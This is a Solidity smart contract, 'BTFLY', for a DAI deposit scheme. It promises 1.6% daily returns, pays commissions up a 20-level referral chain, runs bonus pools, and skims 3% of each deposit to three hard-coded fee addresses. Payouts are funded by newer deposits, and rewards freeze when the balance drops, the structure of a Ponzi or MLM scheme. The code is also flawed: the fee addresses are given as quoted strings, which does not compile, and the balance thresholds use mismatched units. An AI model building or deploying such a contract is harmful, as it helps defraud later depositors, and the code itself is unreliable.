// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import "./SafeMath.sol";
import "./IERC20.sol";


contract BTFLY {
    using SafeMath for uint; 
    IERC20 public dai;
    
    uint private constant BASE_DIVIDER = 10000;
    uint private constant FEE_PERCENTS = 300; 
    uint private constant MIN_DEPOSIT = 50e18;
    uint private constant MAX_DEPOSIT = 2000e18;
    uint private constant FREEZE_INCOME_PERCENTS = 3000;
    uint private constant TIME_STEP = 1 days;
    uint private constant DAY_PER_CYCLE = 1 days; 
    uint private constant DAY_REWARD_PERCENTS = 160;
    uint private constant MAX_ADD_FREEZE = 4 days;
    uint private constant REFER_DEPTH = 20;
    uint private constant DIRECT_PERCENTS = 400;

    uint private constant STAR_POOL_PERCENTS = 30;
    uint private constant TOP_POOL_PERCENTS = 20;

    uint[4] private level4Percents = [100, 200, 300, 100];
    uint[15] private level5Percents = [5000, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50];

    

    uint[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint[5] private balRecover = [15e18, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint=>bool) public balStatus; // bal=>status

    address[3] public feeReceivers;

    address public defaultRefer;
    uint public startTime;
    uint public lastDistribute;
    uint public totalUser;
    uint public starPool;
    uint public topPool;
    mapping(uint=>address[3]) public dayTopUsers;

    address[] public level4Users;

    struct OrderInfo {
        uint amount; 
        uint start;
        uint unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint start;
        uint level;
        uint maxDeposit;
        uint totalDeposit;
        uint teamNum;
        uint maxDirectDeposit;
        uint teamTotalDeposit;
        uint totalFreezed;
        uint totalRevenue;
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(uint => mapping(address => uint)) public userLayer1DayDeposit;
    mapping(address => mapping(uint => address[])) public teamUsers;

    struct RewardInfo{
        uint capitals;
        uint statics;
        uint directs;
        uint level4Freezed;
        uint level4Released;
        uint level5Left;
        uint level5Freezed;
        uint level5Released;
        uint star;
        uint top;
        uint split;
        uint splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint amount);
    event DepositBySplit(address user, uint amount);
    event TransferBySplit(address user, address receiver, uint amount);
    event Withdraw(address user, uint withdrawable);

    constructor() {
        
        dai = IERC20(0xC87385b5E62099f92d490750Fcd6C901a524BBcA);
        
        feeReceivers = ["0x3aC05AeAe947Fe71e7654c42e33b4E3436aA8024", "0x5bb1865856051138bC7696993302726299C6872e", "0xdc7679188E1ff0c513457f9be8df94d5EdFfBF88"];
        
        startTime = block.timestamp;
        
        lastDistribute = block.timestamp;
        
        defaultRefer = 0x5e61592E3FcA39951E1f5CeE12081Dff5f46C74a;
    }
    
    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint _amount) external {
        require(_amount >= MIN_DEPOSIT && _amount <= MAX_DEPOSIT && _amount.mod(MIN_DEPOSIT) == 0, "amount err");
        dai.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint _amount) external {
        require(_amount >= MIN_DEPOSIT && _amount.mod(MIN_DEPOSIT) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint _amount) external {
        require(_amount >= MIN_DEPOSIT && _amount.mod(MIN_DEPOSIT) == 0, "amount err");
        uint splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(TIME_STEP)){
            uint dayNow = getCurDay();
            _distributeStarPool();

            _distributeTopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {
        distributePoolRewards();
        (uint staticReward, uint staticSplit) = _calCurStaticRewards(msg.sender);
        uint splitAmt = staticSplit;
        uint withdrawable = staticReward;

        (uint dynamicReward, uint dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.directs = 0;
        userRewards.level4Released = 0;
        userRewards.level5Released = 0;
        
        userRewards.star = 0;
        userRewards.top = 0;
        
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        
        dai.transfer(msg.sender, withdrawable);
        uint bal = dai.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }
    function getContractBalance() external view returns(uint){
        return dai.balanceOf(address(this));
    }

    function getCurDay() public view returns(uint) {
        return (block.timestamp.sub(startTime)).div(TIME_STEP);
    }

    function getTeamUsersLength(address _user, uint _layer) external view returns(uint) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint) {
        uint maxFreezing;
        for(uint i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint, uint, uint){
        uint totalTeam;
        uint maxTeam;
        uint otherTeam;
        for(uint i = 0; i < teamUsers[_user][0].length; i++){
            uint userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint){
        (, uint staticSplit) = _calCurStaticRewards(_user);
        (, uint dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint, uint) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint totalRewards = userRewards.statics;
        uint splitAmt = totalRewards.mul(FREEZE_INCOME_PERCENTS).div(BASE_DIVIDER);
        uint withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint, uint) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint totalRewards = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released);
        totalRewards = totalRewards.add(userRewards.star.add(userRewards.top));
        uint splitAmt = totalRewards.mul(FREEZE_INCOME_PERCENTS).div(BASE_DIVIDER);
        uint withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint i = 0; i < REFER_DEPTH; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint _amount, uint _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint _dayNow) private {
        for(uint i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint i = 0; i < REFER_DEPTH; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint i = 0; i < REFER_DEPTH; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 4){
                level4Users.push(_user);
            }
        }
    }

    function _calLevelNow(address _user) private view returns(uint) {
        UserInfo storage user = userInfo[_user];
        uint total = user.totalDeposit;
        uint levelNow;
        if(total >= 1000e18){
            (uint maxTeam, uint otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 6 && maxTeam >= 4000e18 && otherTeam >= 4000e18){
                levelNow = 5;
            }else if(user.teamNum >= 5 && maxTeam >= 1000e18 && otherTeam >= 1000e18){
                levelNow = 4;
            }else{
                levelNow = 3;
            }
        }else if(total >= 500e18){
            levelNow = 2;
        }else if(total >= 50e18){
            levelNow = 1;
        }

        return levelNow;
    }

    function _deposit(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= MIN_DEPOSIT, "less than min");
        require(_amount <= MAX_DEPOSIT, "you reach max amount deposit");
        require(_amount.mod(MIN_DEPOSIT) == 0 && _amount >= MIN_DEPOSIT, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if(user.totalDeposit == 0){
            uint dayNow = getCurDay();
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        uint addFreeze = (orderInfos[_user].length.div(2)).mul(TIME_STEP);
        if(addFreeze > MAX_ADD_FREEZE){
            addFreeze = MAX_ADD_FREEZE;
        }
        uint unfreezeTime = block.timestamp.add(DAY_PER_CYCLE).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        _updateReferInfo(msg.sender, _amount);

        _updateReward(msg.sender, _amount);

        _releaseUpRewards(msg.sender, _amount);

        uint bal = dai.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);

                uint staticReward = order.amount.mul(DAY_REWARD_PERCENTS).mul(DAY_PER_CYCLE).div(TIME_STEP).div(BASE_DIVIDER);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        if(!isUnfreezeCapital){ 
            RewardInfo storage userReward = rewardInfo[_user];
            if(userReward.level5Freezed > 0){
                uint release = _amount;
                if(_amount >= userReward.level5Freezed){
                    release = userReward.level5Freezed;
                }
                userReward.level5Freezed = userReward.level5Freezed.sub(release);
                userReward.level5Released = userReward.level5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }

    function _distributeStarPool() private {
        uint level4Count;
        for(uint i = 0; i < level4Users.length; i++){
            if(userInfo[level4Users[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint reward = starPool.div(level4Count);
            uint totalReward;
            for(uint i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
                    rewardInfo[level4Users[i]].star = rewardInfo[level4Users[i]].star.add(reward);
                    userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool > totalReward){
                starPool = starPool.sub(totalReward);
            }else{
                starPool = 0;
            }
        }
    }

    function _distributeTopPool(uint _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint72[3] memory maxReward = [2000e18, 1000e18, 500e18];
        uint totalReward;
        for(uint i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint reward = topPool.mul(rates[i]).div(BASE_DIVIDER);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }

    function _distributeDeposit(uint _amount) private {
        uint fee = _amount.mul(FEE_PERCENTS).div(BASE_DIVIDER);
        dai.transfer(feeReceivers[0], fee.div(3));
        dai.transfer(feeReceivers[1], fee.div(3));
        dai.transfer(feeReceivers[2], fee.div(3));
        
        uint star = _amount.mul(STAR_POOL_PERCENTS).div(BASE_DIVIDER);
        starPool = starPool.add(star);
        uint top = _amount.mul(TOP_POOL_PERCENTS).div(BASE_DIVIDER);
        topPool = topPool.add(top);
    }

    function _updateReward(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint i = 0; i < REFER_DEPTH; i++){
            if(upline != address(0)){
                uint newAmount = _amount;
                if(upline != defaultRefer){
                    uint maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint reward;
                if(i > 4){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level5Percents[i - 5]).div(BASE_DIVIDER);
                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                    }
                }else if(i > 0){
                    if( userInfo[upline].level > 3){
                        reward = newAmount.mul(level4Percents[i - 1]).div(BASE_DIVIDER);
                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    }
                }else{
                    reward = newAmount.mul(DIRECT_PERCENTS).div(BASE_DIVIDER);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _releaseUpRewards(address _user, uint _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint i = 0; i < REFER_DEPTH; i++){
            if(upline != address(0)){
                uint newAmount = _amount;
                if(upline != defaultRefer){
                    uint maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                if(i > 0 && i < 5 && userInfo[upline].level > 3){
                    if(upRewards.level4Freezed > 0){
                        uint level4Reward = newAmount.mul(level4Percents[i - 1]).div(BASE_DIVIDER);
                        if(level4Reward > upRewards.level4Freezed){
                            level4Reward = upRewards.level4Freezed;
                        }
                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
                    }
                }

                if(i >= 5 && userInfo[upline].level > 4){
                    if(upRewards.level5Left > 0){
                        uint level5Reward = newAmount.mul(level5Percents[i - 5]).div(BASE_DIVIDER);
                        if(level5Reward > upRewards.level5Left){
                            level5Reward = upRewards.level5Left;
                        }
                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); 
                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);
                    }
                }
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint _bal) private {
        for(uint i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint _bal) private {
        for(uint i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(BASE_DIVIDER);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
}